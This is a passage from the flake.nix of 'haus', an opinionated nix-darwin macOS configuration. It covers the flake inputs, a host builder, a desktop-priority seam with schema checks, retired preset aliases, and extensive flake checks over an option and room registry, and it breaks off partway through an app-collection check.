{
  description = "haus — an opinionated macOS, raised in the fog";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixpkgs-unstable";

    nix-darwin = {
      url = "github:LnL7/nix-darwin/master";
      inputs.nixpkgs.follows = "nixpkgs";
    };

    home-manager = {
      url = "github:nix-community/home-manager";
      inputs.nixpkgs.follows = "nixpkgs";
    };

    catppuccin.url = "github:catppuccin/nix";

    # The silver-mist theme (Catppuccin with the blue stripped, whiskered — Mocha
    # for dark, Latte for light). Rendered in a pure derivation so themes rebuild
    # with `darwin-rebuild`.
    nebelung = {
      url = "github:hausfold/nebelung";
      inputs.nixpkgs.follows = "nixpkgs";
      inputs.catppuccin.follows = "catppuccin";
    };

    # The command palette. Its overlay puts `pounce` + `pounce-commands` in pkgs.
    # pounce compiles its DEFAULT nebelung palette in at build time (variants
    # load at runtime from ~/.config/pounce/themes/); point it at the rice's own
    # nebelung so that default can't drift from the rest of the theme.
    pounce = {
      url = "github:hausfold/pounce";
      inputs.nixpkgs.follows = "nixpkgs";
      inputs.nebelung.follows = "nebelung";
    };

    # The notch file shelf. Its overlay puts `perch` in pkgs; modules/shelf
    # places the app at a fixed /Applications path. What gets BUILT is perch's
    # CI-built, notarized release ZIP (macOS 26 blocks a from-source Nix build —
    # see the perch repo), because perch's own flake pins that zip in
    # `nix/release.nix`. The pin is inside perch, not here: this input has no
    # `ref`, so it tracks perch's default branch like any other. Saying it
    # "tracks releases" reads as a `ref = "refs/tags/…"` that isn't there, and
    # the docs took it that way once.
    perch = {
      url = "github:hausfold/perch";
      inputs.nixpkgs.follows = "nixpkgs";
    };

    # The agent-worktree substrate — a standalone Go binary, the rewrite of
    # the rice's old bash `wt.sh` (now retired entirely). Its overlay puts
    # `holt` in pkgs, and core ships it on PATH as the only worktree-lifecycle
    # CLI the rice knows.
    holt = {
      url = "github:hausfold/holt";
      inputs.nixpkgs.follows = "nixpkgs";
    };

    nix-index-database = {
      url = "github:nix-community/nix-index-database";
      inputs.nixpkgs.follows = "nixpkgs";
    };
  };

  outputs =
    inputs@{
      self,
      nixpkgs,
      nix-darwin,
      home-manager,
      catppuccin,
      nebelung,
      pounce,
      perch,
      holt,
      nix-index-database,
    }:
    let
      # The house builder. Point it at a host file and it raises a full system.
      #   mkHaus { username = "ada"; hostname = "lovelace"; host = ./hosts/ada; }
      mkHaus =
        {
          username,
          hostname,
          host ? ./hosts/example,
          system ? "aarch64-darwin",
          extraModules ? [ ],
          # Which desktop this machine runs — exactly one, and `hacker` unless
          # you say otherwise, which is what keeps every existing consumer
          # building unchanged: this default has always meant "the opinionated
          # developer machine", and only its name changed. `null` selects none:
          # the bare haus foundation plus whatever your host turns on, which is
          # what the built-in blank desktop names.
          desktop ? ./desktops/hacker.nix,
        }:
        let
          # Machine-written config stays ordinary Nix. Pounce "Install App"
          # writes one module per package; `haus set` does the same for settings.
          # Both directories are auto-imported, so there is no parallel JSON
          # store and every generated value still travels through the public
          # option a person would write by hand.
          hostModuleDir = name: if builtins.typeOf host == "path" then host + "/${name}" else null;
          modulesIn =
            dir:
            if dir != null && builtins.pathExists dir then
              map (name: dir + "/${name}") (
                builtins.filter (
                  name:
                  name != "default.nix"
                  && nixpkgs.lib.hasSuffix ".nix" name
                  && builtins.elem (builtins.readDir dir).${name} [
                    "regular"
                    "symlink"
                  ]
                ) (builtins.attrNames (builtins.readDir dir))
              )
            else
              [ ];
          hostWrittenModules = modulesIn (hostModuleDir "packages") ++ modulesIn (hostModuleDir "settings");
        in
        nix-darwin.lib.darwinSystem {
          inherit system;
          specialArgs = { inherit inputs username hostname; };
          modules = [
            # The builder's `system` arg decides the platform (mkDefault so a
            # host file can still override). Was hardcoded in core, which broke
            # x86_64-darwin no matter what callers passed.
            { nixpkgs.hostPlatform = nixpkgs.lib.mkDefault system; }
            {
              nixpkgs.overlays = [
                pounce.overlays.default
                perch.overlays.default
                holt.overlays.default
              ];
            }
            home-manager.darwinModules.home-manager
            {
              users.users.${username} = {
                name = username;
                home = "/Users/${username}";
              };
              home-manager.useGlobalPkgs = true;
              home-manager.useUserPackages = true;
              home-manager.backupFileExtension = "backup";
              home-manager.extraSpecialArgs = {
                inherit username inputs;
                nebelung = {
                  themes = nebelung.packages.${system}.default;
                  palette = nebelung.palette;
                  # Every rendered variant, so a module can follow
                  # haus.theme.{flavor,contrast}. Selection has to happen in
                  # the modules rather than here: extraSpecialArgs is built before
                  # any option is evaluated. modules/lib/nebelung.nix does it.
                  palettes = nebelung.palettes;
                  # Per-port install metadata (nebelung's `ports` output): where
                  # each rendered theme has to land and what makes it active.
                  # `or { }` because an older nebelung lock predates the output —
                  # the same graceful-degradation rule modules/lib/nebelung.nix
                  # follows for palettes, so consuming this doesn't force a lock
                  # bump on anyone still pinned behind it.
                  ports = nebelung.ports or { };
                };
              };
              home-manager.sharedModules = [
                catppuccin.homeModules.catppuccin
                nix-index-database.homeModules.nix-index
              ];
            }
            self.darwinModules.default
          ]
          # Before the host, though the ladder is what actually decides: the
          # desktop's leaves arrive at `desktopPriority`, so a plain assignment
          # in the host below wins no matter which order they are imported in.
          ++ nixpkgs.lib.optional (desktop != null) (riceLib.desktop desktop)
          ++ [
            host
          ]
          ++ hostWrittenModules
          ++ extraModules;
        };
      # The retired preset format, as compatibility aliases. Each one is a
      # MODULE that warns and carries the old file's values at the old priority,
      # so a consumer's `extraModules = [ haus.presets.everyday ]` still builds
      # the machine it always did. What each became is in compat/presets.nix;
      # the new spellings are `desktops/*` and `haus.appearance.largePrint`.
      presetModules = import ./compat/presets.nix;

      # The public helpers behind `haus.lib`: the desktop seam, its checker and
      # the priority it carries a desktop in at. It is `rec` because the seam
      # asserts on the checker beside it.
      riceLib = rec {
        # ---- desktops ---------------------------------------------------------
        # A DESKTOP is a complete answer to "what should this Mac feel like?",
        # and a host selects exactly one (the workshop's
        # notes/rooms-desktops.md). It is the whole selection — which is why it
        # gets a closed schema and a trust boundary rather than a stray-key
        # check.
        #
        # It is also, since 2026-08-17, one of exactly TWO shareable formats,
        # and the only data one. A third — the app PACK, a data-only file
        # narrowed to `haus.roster`, imported through the retired
        # `haus.lib.pack` — used to sit beside it. It is gone from the public
        # surface: a stranger's app collection is a ROOM now (code, an ordinary
        # flake input, its own trust prompt), and the collections this repo
        # ships stayed where step 5 put them, inside the Apps room behind
        # `haus.apps.packs.<name>.enable`. Two formats, one per trust class:
        # data haus can prove is inert, and code it cannot.
        #
        # The rules it is held to live in modules/lib/desktop.nix and are read
        # off the room registry, so "may a desktop set this?" has exactly one
        # answer per option, in one file, for the docs, the check and this seam.

        # Where the desktop's values sit in the priority ladder, and the reason
        # a host can override its desktop with a PLAIN assignment:
        #
        #   100   the host — an ordinary line in your own host file
        #   900   the desktop  ← here
        #   1000  a room's own mkDefault
        #   1500  an option's declared default
        #
        # Lower wins. Sitting between the host and the rooms is the whole
        # requirement: a desktop must outrank the generic defaults it exists to
        # replace, and must lose to the person who chose it — without anyone
        # having to write `lib.mkForce` for ordinary customization.
        desktopPriority = 900;

        # Every reason `path` is not a desktop; `[ ]` means it is one. Public
        # because a third party publishing a desktop should be able to self-test
        # it, and because a LIST is what lets the flake check diff the exact
        # diagnostics rather than prove only that something refused.
        desktopFailures =
          path:
          desktopLib.failures {
            source = toString path;
            value = import path;
          };

        # `haus.lib.showDesktop ./my-desktop.nix` — the same reading `haus show`
        # prints, as data: the class, the failures above, what the file sets and
        # which rooms it leaves alone. The CLI evaluates the identical function
        # out of a staged copy (modules/desktop-check.nix) so it can answer from
        # a shell with no flake; this export is what the flake check and any
        # other Nix caller uses.
        showDesktop = path: showLib.read (toString path);

        # `haus.lib.checkDesktop ./my-desktop.nix` — true, or throws naming the
        # file and every rule it broke.
        checkDesktop =
          path:
          let
            failures = desktopFailures path;
          in
          if failures == [ ] then
            true
          else
            throw ("checkDesktop:\n" + builtins.concatStringsSep "\n" failures);

        # The import seam. Validate, carry each LEAF in at the desktop priority
        # (per leaf for the same reason `pack` does it — a priority at or above
        # an option replaces the definition rather than deprioritising it), and
        # record the filename so "you selected two desktops" can name both.
        #
        # `mkHaus` passes its `desktop` argument through here; a consumer
        # composing by hand uses it directly — and passes `desktop = null`
        # alongside, or the builder's own default is the second desktop:
        #   mkHaus {
        #     …
        #     desktop = null;
        #     extraModules = [ (haus.lib.desktop ./their-desktop.nix) ];
        #   }
        desktop =
          path:
          assert checkDesktop path;
          {
            # Same debt `pack` pays: this builds a NEW attrset, so without a
            # `_file` the module system would report a conflict against the
            # desktop as `<unknown-file>`.
            _file = toString path;

            haus = desktopLib.prioritize desktopPriority ((import path).haus or { }) // {
              # Plainly, at normal priority: the entries have to CONCATENATE so
              # two desktops produce a two-entry list for the assertion to
              # refuse. A prioritised definition would collide instead, and the
              # error would name neither file.
              _desktop.sources = [ (toString path) ];
            };
          };
      };

      # The desktops this flake ships — names in modules/desktop-names.nix,
      # which `haus desktop`'s listing stages from the same source so the two
      # cannot drift apart.
      desktopFiles = nixpkgs.lib.genAttrs (import ./modules/desktop-names.nix) (n: ./desktops/${n}.nix);
      desktopLib = import ./modules/lib/desktop.nix {
        lib = nixpkgs.lib;
        registry = import ./modules/options-groups.nix;
      };
      showLib = import ./modules/lib/show.nix {
        lib = nixpkgs.lib;
        registry = import ./modules/options-groups.nix;
      };

      # Linux is in here for the pure-evaluation outputs only (options-json, the
      # theme-variants check) — that's what lets hausfold.co's Linux CI render the
      # options reference. Anything needing a darwin system is guarded per-output.
      #
      # Darwin is aarch64 only: nixpkgs 26.11 dropped x86_64-darwin (Apple's own
      # Intel sunset), so instantiating a package set or a darwin system for it now
      # throws at eval. The rice targets Apple Silicon anyway; the Intel eval that
      # used to live here (example-intel) went with it.
      allSystems = [
        "aarch64-darwin"
        "aarch64-linux"
        "x86_64-linux"
      ];
      # A public partial carries the whole declaration surface plus the shared
      # normalized roster/workspace foundation its implementation may consume.
      # Core is the safe foundation; beyond it only the named room implementation
      # is active. This is the current pre-Blank equivalent of “Blank + room”.
      standaloneModule =
        {
          implementation,
          activation ? null,
        }:
        {
          imports =
            (import ./modules/options-modules.nix)
            ++ nixpkgs.lib.optional (activation != null) activation
            ++ [
              # The desktop seam's assertion. A standalone import selects NO desktop
              # and must keep evaluating that way — what this adds is only the
              # refusal of a second one, which a consumer can reach from here too by
              # passing `lib.desktop` through their own module list.
              ./modules/desktop
              # And the namespace seam, for the same reason: a partial import is
              # still a machine, and the private room it collides with is the
              # consumer's, not haus's. It stays silent here by construction —
              # every namespace a partial declares is one of haus's own.
              ./modules/namespaces.nix
              ./modules/workspaces
              ./modules/roster
              # The AI room's wiring. In the foundation rather than a room of its own
              # because it publishes the extension points the rooms below read
              # (modules/lib/contrib.nix), and a partial that imported only `bar`
              # would otherwise draw its agents pill off an unwritten seam. What that
              # costs is honest and temporary: the room adds no packages, only
              # assertions and contributions, and step 3 of the rooms plan is what
              # decides whether Blank carries it.
              ./modules/ai
              ./modules/core
              implementation
            ];
        };
    in
    {
      # Import the whole house, or one self-contained implementation partial.
      # Named exports carry the declaration + shared-data foundation above;
      # they do not activate any other room implementation.
      darwinModules = {
        core = standaloneModule { implementation = ./modules/core; };
        terminal = standaloneModule {
          implementation = ./modules/terminal;
          activation = { lib, ... }: { haus.developer.enable = lib.mkDefault true; };
        };
        windows = standaloneModule {
          implementation = ./modules/windows;
          activation = { lib, ... }: { haus.windows.enable = lib.mkDefault true; };
        };
        bar = standaloneModule {
          implementation = ./modules/bar;
          activation = { lib, ... }: { haus.bar.enable = lib.mkDefault true; };
        };
        security = standaloneModule {
          implementation = ./modules/security;
          activation = { lib, ... }: { haus.security.touchId.enable = lib.mkDefault true; };
        };
        launcher = standaloneModule {
          implementation = ./modules/launcher;
          activation = { lib, ... }: { haus.launcher.enable = lib.mkDefault true; };
        };
        focus = standaloneModule {
          implementation = ./modules/focus;
          activation = { lib, ... }: { haus.focus.enable = lib.mkDefault true; };
        };
        secrets = standaloneModule { implementation = ./modules/secrets; };
        default = ./modules;
      };

      inherit mkHaus;

      # ---- presets: retired, aliased ------------------------------------------
      # `haus.presets.<name>` still resolves, warns, and produces the machine it
      # always did. It is no longer a format: a preset was a data-only rice you
      # STACKED beside another one, and the rooms model has exactly one desktop
      # per host, because two whole selections that disagree about an option
      # stop the build with nothing able to arbitrate them.
      #
      #   presets.full         →  the hacker desktop (the builder's default)
      #   presets.minimal      →  desktops.minimal
      #   presets.everyday     →  desktops.everyday
      #   presets.large-print  →  haus.appearance.largePrint = true
      #
      # The data-only TRUST boundary these dogfooded did not retire with them:
      # it is a desktop's now, enforced leaf by leaf against the room registry
      # (`lib.checkDesktop`) rather than by a top-level stray-key rule. See
      # compat/presets.nix, and delete both together.
      presets = presetModules;

      # `haus.desktops.hacker` — the desktop FILES, unwrapped. A path is the
      # right thing to hand `lib.checkDesktop`,
      # and it is what `mkHaus`'s `desktop` argument takes:
      #
      #   mkHaus { … desktop = haus.desktops.hacker; }
      #
      # Wrapping happens at the seam (`lib.desktop`), not here, because the
      # wrapper is what applies the priority that makes a host win — a
      # pre-wrapped module would look importable anywhere and quietly bypass the
      # one-desktop assertion when it wasn't.
      desktops = desktopFiles;

      lib = riceLib;

      # `nix flake check` — the shareable catalogue. Everything a consumer can
      # point at by name has to actually raise a machine, which is a different
      # property from being well-formed and is the one that reaches a stranger:
      # a desktop that is beautifully closed-schema and doesn't build is worse
      # than no desktop. Evaluation only — the drv paths are stripped of
      # context, so this checks the catalogue rather than building nixpkgs.
      #
      # Three shapes, one check, because they fail the same way:
      #
      #   desktops   selected the way a host selects one, through the builder
      #   collections  the Apps room's saved app sets, switched on the way a
      #              host switches one on — which is where a roster entry's
      #              assertions bite: a leader key another entry or a built-in
      #              launch action already owns type-checks fine and then stops
      #              the build. Reading the file would not have caught that;
      #              evaluating does.
      #   presets    the retired aliases (compat/presets.nix). They are here so
      #              "still works" is a fact rather than a promise in a comment.
      #
      # There is no data-only guard beside it any more. `checkRice` was the pack
      # format's trust half, and the format is retired; a desktop's equivalent
      # boundary is stricter, lives in `lib.checkDesktop`, and is checked by
      # `desktop-seam`. A collection file is this repo's own now, so "is it
      # data?" is a code-review question rather than a check.
      #
      # `theme-variants` runs on EVERY system, Linux included: it's pure lib, the
      # same property that lets options-json build on Linux CI. `catalogue` stays
      # darwin-only — it evaluates real systems.
      checks = nixpkgs.lib.genAttrs allSystems (
        system:
        let
          pkgs = nixpkgs.legacyPackages.${system};
          # The Apps room's saved collections, read off the option tree rather
          # than a hand list, so a new one is covered the day its switch exists.
          collectionNames = builtins.attrNames optionsEval.options.haus.apps.packs;
          # …and the files those switches install, from the table the Apps room
          # itself reads (modules/apps/packs/default.nix).
          collectionFiles = import ./modules/apps/packs;
          exampleDrv =
            args:
            builtins.unsafeDiscardStringContext
              (mkHaus (
                {
                  inherit system;
                  username = "you";
                  hostname = "example";
                }
                // args
              )).system.drvPath;
          evaluated =
            map (n: "desktop ${n} ${exampleDrv { desktop = desktopFiles.${n}; }}") (
              builtins.attrNames desktopFiles
            )
            ++ map (
              n: "collection ${n} ${exampleDrv { extraModules = [ { haus.apps.packs.${n}.enable = true; } ]; }}"
            ) collectionNames
            ++ map (n: "preset ${n} ${exampleDrv { extraModules = [ presetModules.${n} ]; }}") (
              builtins.attrNames presetModules
            );

          # ---- data-only-surface ----------------------------------------------
          # A shared desktop is DATA: an attrset, no arguments, so a checker can
          # read it and so can a person. Which means the option
          # surface itself carries a rule nothing was enforcing — an option typed
          # `package` is INVISIBLE to that format, because setting one needs the
          # single thing a data file cannot have, `pkgs`.
          #
          # That limit was found twice, weeks apart, from two unrelated families:
          # `fonts.mono.package` (a shared rice could make the terminal font bigger
          # but not change its family) and `roster.*.package` (an app pack could
          # install from Homebrew and the App Store but never from Nixpkgs). Both
          # are answered by naming the package instead. The third one will be added
          # by someone who has never read this comment, and it fails in the worst
          # way available: not an error, just an option the audience it was written
          # for silently cannot use.
          #
          # So the rule is mechanical now — every package-typed leaf must have a
          # string sibling of the same name + "Name". It reads the same evaluated
          # option tree the docs are rendered from, so it sees exactly the public
          # surface, and it's pure lib, so it runs on Linux CI with the rest.
          optionsEval = nixpkgs.lib.evalModules {
            specialArgs.lib = nixpkgs.lib;
            modules = import ./modules/options-modules.nix;
          };
          visibleOptions = optionsEval.options // {
            haus = nixpkgs.lib.filterAttrs (
              name: _: !(nixpkgs.lib.hasPrefix "_" name)
            ) optionsEval.options.haus;
          };
          surfaceLeaves = builtins.filter (o: !(o.internal or false) && (o.visible or true)) (
            nixpkgs.lib.optionAttrSetToDocList visibleOptions
          );
          leafType = builtins.listToAttrs (map (o: nixpkgs.lib.nameValuePair o.name o.type) surfaceLeaves);
          # "package", "null or package", "list of package" — the whole family,
          # plus derivations and store paths, which are unreachable for the same
          # reason. `path` is deliberately NOT here: a rice may ship a script
          # beside itself and refer to it as ./thing, which stays data.
          packageTyped = builtins.filter (
            o:
            nixpkgs.lib.hasPrefix "haus." o.name
            && builtins.match ".*(package|derivation|store path).*" o.type != null
          ) surfaceLeaves;
          unnamedPackageOptions = map (o: "${o.name} : ${o.type}") (
            builtins.filter (
              o: builtins.match ".*string.*" (leafType."${o.name}Name" or "") == null
            ) packageTyped
          );

          # ---- room registry -------------------------------------------------
          # Compare the one source registry to evaluated values. A new export or
          # option fails closed until its owner and trust boundary are named.
          registry = import ./modules/options-groups.nix;
          registryOptions = builtins.foldl' (
            acc: namespace: acc // registry.namespaces.${namespace}.options
          ) { } (builtins.attrNames registry.namespaces);
          actualOptionNames = map (o: o.name) (
            builtins.filter (o: nixpkgs.lib.hasPrefix "haus." o.name) surfaceLeaves
          );
          registeredOptionNames = builtins.attrNames registryOptions;
          actualNamespaces = nixpkgs.lib.unique (
            map (name: builtins.elemAt (nixpkgs.lib.splitString "." name) 1) actualOptionNames
          );
          registeredNamespaces = builtins.attrNames registry.namespaces;
          actualExports = builtins.attrNames self.darwinModules;
          registeredExports = builtins.attrNames registry.exports;

          missingOptions = builtins.filter (
            name: !(builtins.elem name registeredOptionNames)
          ) actualOptionNames;
          staleOptions = builtins.filter (
            name: !(builtins.elem name actualOptionNames)
          ) registeredOptionNames;
          missingNamespaces = builtins.filter (
            name: !(builtins.elem name registeredNamespaces)
          ) actualNamespaces;
          staleNamespaces = builtins.filter (
            name: !(builtins.elem name actualNamespaces)
          ) registeredNamespaces;
          missingExports = builtins.filter (name: !(builtins.elem name registeredExports)) actualExports;
          staleExports = builtins.filter (name: !(builtins.elem name actualExports)) registeredExports;

          invalidSafety = builtins.filter (
            name:
            let
              decision = registryOptions.${name}.desktopSafe or null;
            in
            !(decision == true || decision == false || decision == "recursive")
          ) registeredOptionNames;
          invalidRecursive = builtins.filter (
            name:
            let
              meta = registryOptions.${name};
            in
            meta.desktopSafe == "recursive" && (!(meta ? validator) || meta.validator == "")
          ) registeredOptionNames;
          duplicateInventory = builtins.filter (
            namespace:
            registry.namespaces.${namespace}.optionCount
            != builtins.length (builtins.attrNames registry.namespaces.${namespace}.options)
          ) registeredNamespaces;

          dynamicRoot =
            name:
            let
              match = builtins.match "(.*)(\\.<name>|\\.\\*)(\\..*)?" name;
            in
            if match == null then null else builtins.head match;
          dynamicRoots = nixpkgs.lib.unique (
            builtins.filter (name: name != null) (map dynamicRoot actualOptionNames)
          );
          unsafeDynamicRoots = builtins.filter (
            root:
            let
              decision = registryOptions.${root}.desktopSafe or null;
            in
            !(decision == false || decision == "recursive")
          ) dynamicRoots;
          openAttrsets = map (o: o.name) (
            builtins.filter (
              o: nixpkgs.lib.hasPrefix "haus." o.name && nixpkgs.lib.hasPrefix "attribute set" o.type
            ) surfaceLeaves
          );
          unsafeOpenAttrsets = builtins.filter (
            name:
            let
              decision = registryOptions.${name}.desktopSafe or null;
            in
            !(decision == false || decision == "recursive")
          ) openAttrsets;
          unsafeParents = builtins.filter (
            parent:
            registryOptions.${parent}.desktopSafe == true
            && nixpkgs.lib.any (
              child: nixpkgs.lib.hasPrefix "${parent}." child && registryOptions.${child}.desktopSafe == false
            ) registeredOptionNames
          ) registeredOptionNames;

          # ---- validators -----------------------------------------------------
          # Three lists have to agree, and each pair fails a different way.
          # NAMED is what `recursive` puts on a container; IMPLEMENTED is what
          # `modules/lib/desktop.nix` can actually run; EXPLAINED is the
          # sentence a person reads in their host file and on the options page.
          #
          # Named-but-not-implemented already fails closed at evaluation
          # (`validate` refuses an unknown name) — but only on a desktop that
          # sets that container, on someone else's machine. Implemented-but-
          # unnamed is dead code. Neither of those is the reason this check
          # exists: EXPLAINED is, because a validator with no sentence renders
          # as a bare identifier that answers nothing, and nothing about that
          # fails anywhere. It is the same rule as "room with no title or no
          # blurb", one layer down.
          #
          # `or ""`, then dropped, is load-bearing rather than defensive: the
          # `recursive option has no validator` message above is computed from
          # the same options, and `registryFailures` forces this list first, so
          # a bare `.validator` would replace that diagnostic with a Nix trace
          # at exactly the moment it was written to fire.
          namedValidators = builtins.filter (name: name != "") (
            nixpkgs.lib.unique (
              map (name: registryOptions.${name}.validator or "") (
                builtins.filter (name: registryOptions.${name}.desktopSafe == "recursive") registeredOptionNames
              )
            )
          );
          implementedValidators = desktopLib.validatorNames;
          explainedValidators = builtins.attrNames (registry.validators or { });
          unimplementedValidators = builtins.filter (
            name: !(builtins.elem name implementedValidators)
          ) namedValidators;
          unusedValidators = builtins.filter (
            name: !(builtins.elem name namedValidators)
          ) implementedValidators;
          # Trimmed, because a blank-looking sentence renders as a comment line
          # holding nothing but its own indent — the same non-answer as no
          # sentence at all, arrived at by a route the check would wave through.
          unexplainedValidators = builtins.filter (
            name: (nixpkgs.lib.trim (registry.validators.${name}.rule or "")) == ""
          ) implementedValidators;
          strayValidatorRules = builtins.filter (
            name: !(builtins.elem name implementedValidators)
          ) explainedValidators;

          # ---- host-only reasons ----------------------------------------------
          # The same shape one classification over, and it exists for the same
          # reason: `host-only` on its own says a desktop may not set the leaf
          # and nothing about why, which is the half a person actually needs
          # when their own host file is the only place it can go.
          #
          # Two lists, not three, because there is nothing to implement — a
          # reason is read, never run. So NAMED is what `hostOnly` puts on an
          # option and EXPLAINED is `hostOnlyReasons`, and both directions are
          # silent failures without this: a host-only leaf naming no reason
          # renders as the bare classification the site already had, and a
          # name with no sentence renders as nothing at all under a line that
          # promised one.
          hostOnlyOptions = builtins.filter (
            name: registryOptions.${name}.desktopSafe == false
          ) registeredOptionNames;
          namedReasons = builtins.filter (name: name != "") (
            nixpkgs.lib.unique (map (name: registryOptions.${name}.reason or "") hostOnlyOptions)
          );
          explainedReasons = builtins.attrNames (registry.hostOnlyReasons or { });
          unreasonedHostOnly = builtins.filter (
            name: (nixpkgs.lib.trim (registryOptions.${name}.reason or "")) == ""
          ) hostOnlyOptions;
          # Trimmed for the same reason a validator's rule is: a blank sentence
          # is the same non-answer as no sentence, reached by a route a
          # presence check waves through.
          unexplainedReasons = builtins.filter (
            name: (nixpkgs.lib.trim (registry.hostOnlyReasons.${name}.why or "")) == ""
          ) namedReasons;
          strayReasons = builtins.filter (name: !(builtins.elem name namedReasons)) explainedReasons;

          # ---- rooms ----------------------------------------------------------
          # A room is what a person meets; a namespace is how they spell it.
          # `roomOwners` in the registry maps one to the other, and the rooms
          # table gives each room its name and sentence. Both halves have to
          # stay whole: an owner with no room entry renders as a bucket with no
          # title, and a room with no members is a page about nothing. Neither
          # fails on its own — the docs just quietly get worse — so they fail
          # here instead.
          registeredRooms = builtins.attrNames registry.rooms;
          usedOwners = nixpkgs.lib.unique (
            map (namespace: registry.namespaces.${namespace}.owner) registeredNamespaces
            ++ map (name: registry.exports.${name}.owner) registeredExports
          );
          unnamedOwners = builtins.filter (owner: !(builtins.elem owner registeredRooms)) usedOwners;
          emptyRooms = builtins.filter (
            room: registry.rooms.${room}.namespaces == [ ] && registry.rooms.${room}.exports == [ ]
          ) registeredRooms;
          uneditedRooms = builtins.filter (
            room:
            let
              meta = registry.rooms.${room};
            in
            (meta.title or "") == "" || (meta.blurb or "") == ""
          ) registeredRooms;
          # The same rule, one renderer further along. `agent.asks` is what the
          # haus skill's `references/rooms.md` routes a user's sentence on, and
          # a room without it is not a room with a thinner docs page — it is a
          # room an agent silently cannot reach, which the user reads as haus
          # not supporting the thing at all. `agent.cli` is legitimately null
          # for a configuration-only room, so only its PRESENCE is required;
          # `asks` has to be non-empty. See modules/options-groups.nix's header.
          unroutedRooms = builtins.filter (
            room:
            let
              meta = registry.rooms.${room};
            in
            !(meta ? agent) || !(meta.agent ? cli) || (meta.agent.asks or [ ]) == [ ]
          ) registeredRooms;
          # The catalogue is the twelve rooms of the product model. The other
          # two entries exist so every bucket has a title, and they are marked
          # `kind` rather than being told apart by name in each renderer.
          miskindedRooms = builtins.filter (
            room:
            !(builtins.elem registry.rooms.${room}.kind [
              "room"
              "shared"
              "host"
            ])
          ) registeredRooms;
          # The one way this fails OPEN rather than closed: `ownerOf` answers
          # `haus` for a namespace nobody put in `roomOwners`, and `haus` IS a
          # room key, so the rule above sees nothing wrong. A namespace that is
          # a room's by kind and shared by owner is a namespace someone forgot,
          # and it would render under "Shared surfaces" with a green check.
          homelessNamespaces = builtins.filter (
            namespace:
            registry.namespaces.${namespace}.kind == "room" && registry.namespaces.${namespace}.owner == "haus"
          ) registeredNamespaces;
          # And the fix someone reaches for on meeting that message: naming the
          # room in `roomOwners` while leaving the namespace in `shared`/`host`.
          # It evaluates, and produces a namespace labelled shared that renders
          # inside a room. The two lists have to agree.
          misclassedNamespaces = builtins.filter (
            namespace:
            registry.namespaces.${namespace}.kind != "room"
            && registry.rooms.${registry.namespaces.${namespace}.owner}.kind == "room"
          ) registeredNamespaces;

          registryFailures =
            nixpkgs.lib.optional (registry.schemaVersion != 1) "unsupported schemaVersion"
            ++ map (x: "unmapped option: ${x}") missingOptions
            ++ map (x: "stale option: ${x}") staleOptions
            ++ map (x: "unclassified namespace: ${x}") missingNamespaces
            ++ map (x: "stale namespace: ${x}") staleNamespaces
            ++ map (x: "unmapped darwinModules export: ${x}") missingExports
            ++ map (x: "stale darwinModules export: ${x}") staleExports
            ++ map (x: "invalid desktop-safety decision: ${x}") invalidSafety
            ++ map (x: "recursive option has no validator: ${x}") invalidRecursive
            ++ map (x: "registry names a validator nothing implements: ${x}") unimplementedValidators
            ++ map (x: "validator no container names: ${x}") unusedValidators
            ++ map (x: "validator with no rule sentence: ${x}") unexplainedValidators
            ++ map (x: "rule sentence for a validator that does not exist: ${x}") strayValidatorRules
            ++ map (x: "host-only option with no reason: ${x}") unreasonedHostOnly
            ++ map (x: "host-only reason with no sentence: ${x}") unexplainedReasons
            ++ map (x: "reason sentence for a reason no option names: ${x}") strayReasons
            ++ map (x: "duplicate option path in namespace: ${x}") duplicateInventory
            ++ map (x: "unsafe dynamic subtree: ${x}") unsafeDynamicRoots
            ++ map (x: "open attrset has no recursive validator: ${x}") unsafeOpenAttrsets
            ++ map (x: "desktop-safe parent contains a host-only leaf: ${x}") unsafeParents
            ++ map (x: "owner with no room in the catalogue: ${x}") unnamedOwners
            ++ map (x: "room with no namespaces and no exports: ${x}") emptyRooms
            ++ map (x: "room with no title or no blurb: ${x}") uneditedRooms
            ++ map (x: "room with no agent routing (agent.cli / agent.asks): ${x}") unroutedRooms
            ++ map (x: "room with an unknown kind: ${x}") miskindedRooms
            ++ map (x: "namespace in no room — add it to roomOwners: ${x}") homelessNamespaces
            ++ map (x: "namespace owned by a room but listed as shared or host: ${x}") misclassedNamespaces;

          # ---- app collections ------------------------------------------------
          # ONE rule, and it is the one that survived the pack format's
          # retirement (2026-08-17). `haus.lib.pack` used to carry a stranger's
          # data-only file in; a stranger's app collection is a ROOM now, so the
          # only route left is the Apps room's own switch. What did NOT retire
          # with the seam is the trick both of them turn:
          #
          #   the collection's values are lowered PER LEAF, so a host that names
          #   one of its apps wins THAT FIELD and keeps the rest of the entry.
          #
          # It is here because the tempting implementation — `mkDefault` on the
          # whole `roster` attrset instead of on each leaf — passes every other
          # check in this repo while silently dropping three of writing's four
          # apps. `roster` is where the option boundary sits, so a priority at or
          # above it REPLACES the definition rather than deprioritising it, and
          # one normal-priority field in a host takes the whole collection with
          # it. No error; you find out on the machine.
          #
          # This used to be pure lib and ran on Linux CI. It is darwin-only now,
          # and the check is declared in the darwin block to say so: the switch is
          # wired by `modules/apps/default.nix`, which needs `pkgs`, so proving
          # the switch does the right thing means evaluating a real machine — the
          # same reason `desktop-seam`'s behavioural half is darwin-only.
          # Evaluation, not a build.
          #
          # The file each switch installs comes from `modules/apps/packs`, the
          # same table the room reads. Deriving it from the option name instead
          # would make this check read a different file than the room installs
          # the day a name and a filename stop matching, and do it silently.
          collectionCompose =
            name:
            let
              entries = (import collectionFiles.${name}).haus.roster;
              keyed = builtins.filter (id: (entries.${id}.key or null) != null) (builtins.attrNames entries);
              id = builtins.head keyed;
              # The consumer who wants the app but claims no letter for it —
              # today's `mkForce` case, and the one nobody writing the collection
              # can foresee.
              resolved =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [
                    { haus.apps.packs.${name}.enable = true; }
                    { haus.roster.${id}.key = null; }
                  ];
                }).config.haus.roster;
              # Every field the collection set on that entry, other than the one
              # the host overrode, has to survive with the collection's value.
              lost = builtins.filter (f: f != "key" && resolved.${id}.${f} != entries.${id}.${f}) (
                builtins.attrNames entries.${id}
              );
              present = builtins.filter (n: builtins.elem n (builtins.attrNames resolved)) (
                builtins.attrNames entries
              );
            in
            if keyed == [ ] then
              [ ]
            else
              nixpkgs.lib.optional (present != builtins.attrNames entries) (
                "${name}: switching the collection on with a host that names ONE of its apps left "
                + "${toString (builtins.length present)} of "
                + "${toString (builtins.length (builtins.attrNames entries))} entries — the priority in "
